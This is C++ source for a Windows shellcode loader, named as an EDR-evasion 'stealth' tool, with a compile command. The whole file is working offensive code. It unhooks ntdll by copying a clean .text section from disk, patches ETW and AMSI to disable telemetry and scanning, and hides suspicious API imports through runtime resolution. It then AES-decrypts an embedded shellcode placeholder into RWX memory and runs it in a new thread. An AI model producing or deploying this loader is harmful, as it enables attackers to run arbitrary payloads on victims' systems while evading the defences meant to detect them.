// loader_edr_hybrid_stealth.cpp - Hybrid loader with hidden suspicious imports
// Self-injection with dynamic API resolution for clean imports
// Compile: x86_64-w64-mingw32-g++ -O2 -static -s loader_edr_hybrid_stealth.cpp -o loader.exe -lbcrypt -lntdll

#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")

// Embedded encrypted shellcode
unsigned char encryptedShellcode[] = { /* ENCRYPTED_SHELLCODE_HERE */ };
unsigned int encryptedSize = sizeof(encryptedShellcode);

// AES-256 Key
unsigned char aesKey[32] = { /* AES_KEY_HERE */ };

// ==================== DYNAMIC API RESOLUTION ====================
// Function pointer types for APIs we want to hide
typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI* pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HANDLE (WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD (WINAPI* pWaitForSingleObject)(HANDLE, DWORD);

// ==================== NTDLL UNHOOKING ====================
BOOL UnhookNTDLL() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDosHeader->e_lfanew);

    // Map clean copy of ntdll.dll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hFileMapping) return FALSE;

    LPVOID pCleanNtdll = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hFileMapping);
    if (!pCleanNtdll) return FALSE;

    // Dynamically resolve VirtualProtect to hide from imports
    pVirtualProtect fnVirtualProtect = (pVirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");

    // Find .text section and restore it
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSectionHeader[i].Name, ".text") == 0) {
            DWORD oldProtect;
            fnVirtualProtect((LPVOID)((PBYTE)hNtdll + pSectionHeader[i].VirtualAddress),
                pSectionHeader[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            memcpy((LPVOID)((PBYTE)hNtdll + pSectionHeader[i].VirtualAddress),
                (LPVOID)((PBYTE)pCleanNtdll + pSectionHeader[i].VirtualAddress),
                pSectionHeader[i].Misc.VirtualSize);

            fnVirtualProtect((LPVOID)((PBYTE)hNtdll + pSectionHeader[i].VirtualAddress),
                pSectionHeader[i].Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }

    UnmapViewOfFile(pCleanNtdll);
    return TRUE;
}

// ==================== ETW PATCHING ====================
BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    // Dynamically resolve VirtualProtect
    pVirtualProtect fnVirtualProtect = (pVirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");

    DWORD oldProtect;
    if (!fnVirtualProtect((LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    // Patch with RET instruction (0xC3)
    *(BYTE*)pEtwEventWrite = 0xC3;
    
    fnVirtualProtect((LPVOID)pEtwEventWrite, 1, oldProtect, &oldProtect);
    return TRUE;
}

// ==================== AMSI PATCHING ====================
BOOL PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE; // AMSI not loaded, no need to patch

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return TRUE;

    // Patch to return E_INVALIDARG (0x80070057)
    // mov eax, 0x80070057; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;
    
    // Dynamically resolve VirtualProtect
    pVirtualProtect fnVirtualProtect = (pVirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
    
    if (!fnVirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    memcpy((void*)pAmsiScanBuffer, patch, sizeof(patch));
    fnVirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

// ==================== AES-256 DECRYPTION ====================
BOOL AES_Decrypt(BYTE* encrypted, DWORD encSize, BYTE* key, BYTE** output, DWORD* outSize) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbData, cbKeyObject;
    PBYTE pbKeyObject = NULL;
    
    BYTE* iv = encrypted;
    BYTE* ciphertext = encrypted + 16;
    DWORD cipherLen = encSize - 16;
    
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;
    
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
        (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, 
        (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    // Dynamically resolve VirtualAlloc to hide from imports
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
    pVirtualFree fnVirtualFree = (pVirtualFree)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualFree");
    
    *output = (BYTE*)fnVirtualAlloc(NULL, cipherLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*output) {
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    ULONG cbResult;
    status = BCryptDecrypt(hKey, ciphertext, cipherLen, NULL, iv, 16, *output, cipherLen, &cbResult, 0);
    
    if (!BCRYPT_SUCCESS(status)) {
        fnVirtualFree(*output, 0, MEM_RELEASE);
        *output = NULL;
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    if (cbResult > 0) {
        BYTE padding = (*output)[cbResult - 1];
        if (padding > 0 && padding <= 16 && padding <= cbResult) {
            cbResult -= padding;
        }
    }
    
    *outSize = cbResult;
    
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    
    return TRUE;
}

// ==================== MAIN - SELF-INJECTION WITH HIDDEN APIs ====================
int main() {
    // Unhook NTDLL
    UnhookNTDLL();

    // Patch ETW
    PatchETW();

    // Patch AMSI
    PatchAMSI();

    // Decrypt shellcode
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;
    
    if (!AES_Decrypt(encryptedShellcode, encryptedSize, aesKey, &shellcode, &shellcodeSize)) {
        return 1;
    }

    // Dynamically resolve suspicious APIs to hide from imports
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
    pVirtualFree fnVirtualFree = (pVirtualFree)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualFree");
    pCreateThread fnCreateThread = (pCreateThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");
    pWaitForSingleObject fnWaitForSingleObject = (pWaitForSingleObject)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WaitForSingleObject");

    // Allocate RWX memory in current process
    LPVOID pShellcode = fnVirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!pShellcode) {
        fnVirtualFree(shellcode, 0, MEM_RELEASE);
        return 1;
    }
    
    // Copy shellcode
    memcpy(pShellcode, shellcode, shellcodeSize);
    
    // Clean up decrypted copy
    SecureZeroMemory(shellcode, shellcodeSize);
    fnVirtualFree(shellcode, 0, MEM_RELEASE);
    
    // Create thread to execute shellcode
    HANDLE hThread = fnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
    
    if (!hThread) {
        fnVirtualFree(pShellcode, 0, MEM_RELEASE);
        return 1;
    }
    
    // Wait for shellcode to complete initialization
    fnWaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    
    return 0;
}
